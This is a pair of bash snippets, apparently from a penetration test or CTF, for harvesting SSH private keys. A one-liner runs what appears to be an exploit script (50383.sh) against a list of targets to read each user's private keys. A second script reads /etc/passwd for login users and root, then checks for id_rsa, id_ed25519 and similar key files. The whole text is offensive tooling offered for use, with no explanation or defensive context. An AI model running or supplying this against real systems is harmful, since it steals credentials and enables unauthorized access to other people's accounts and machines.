# 

for users in $(cat users.txt); do for keys in $(cat keys.txt); do echo "Looking at User: $users and Key: $keys"; ./50383.sh targets.txt /home/$users/.ssh/$keys; done; done


#!/bin/bash

# Create word list containing SSH key filenames
echo "id_rsa" > keys.txt
echo "id_dsa" >> keys.txt
echo "id_ecdsa" >> keys.txt
echo "id_ed25519" >> keys.txt

# Extract users with UID > 1000 and with valid shells from /etc/passwd
users_list=$(awk -F: '($3 > 1000 && $7 != "/sbin/nologin" && $7 != "/usr/sbin/nologin" && $7 != "/bin/false") {print $1}' /etc/passwd)

# Add root user to the list
users_list+=" root"

# Create a file to store users
echo "$users_list" > users.txt

# Iterate through each user and SSH key combination
for user in $(cat users.txt); do
    for key in $(cat keys.txt); do
        echo "Looking at User: $user and Key: $key"
        # Check if the SSH key file exists for the current user
        if [ -f "/home/$user/.ssh/$key" ]; then
            echo "SSH key found for user $user: /home/$user/.ssh/$key"
            # Add the user and key combination to a file for further analysis
            echo "$user: /home/$user/.ssh/$key" >> ssh_keys_found.txt
        fi
    done
done
